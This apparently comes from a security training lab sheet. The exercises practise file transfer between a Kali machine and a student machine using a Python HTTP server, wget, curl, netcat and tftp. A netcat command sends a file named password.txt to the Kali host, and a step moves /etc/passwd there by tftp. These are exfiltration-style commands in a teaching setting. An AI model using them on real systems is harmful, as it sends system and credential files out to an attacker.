#### Exercices
1. On your Kali machine, create a file named malware.php.
    ````
    echo "This is a malware file" > malware.php
    ````
    Then, in the same directory, ccreate a temporary server with python on port 5000.
    ````
    python3 -m http.server 5000
    ````
1. On your Student machine, download the malware.txt file with the wget command.
    > Your command : wget 10.40.5.X:5000/malware.php

1. On your Student machine, download the malware.txt file with the cURL command.
    > Your command : curl 10.40.5.X:5000/malware.php --output malware.php

1. On the student machine, create a file named password.txt and transfer it to your kali machine with netcat
    > Your commands : touch password.txt
    > ON RECEIVING END : nc -l -p 1234 > password.txt
    > ON SENDING END : nc -w 3 [destination] 1234 < password.txt

1. On the student machine,  transfer ``/etc/passwd`` file to your kali machine with tftp
    > Your commands :  tftp 10.12.172.105
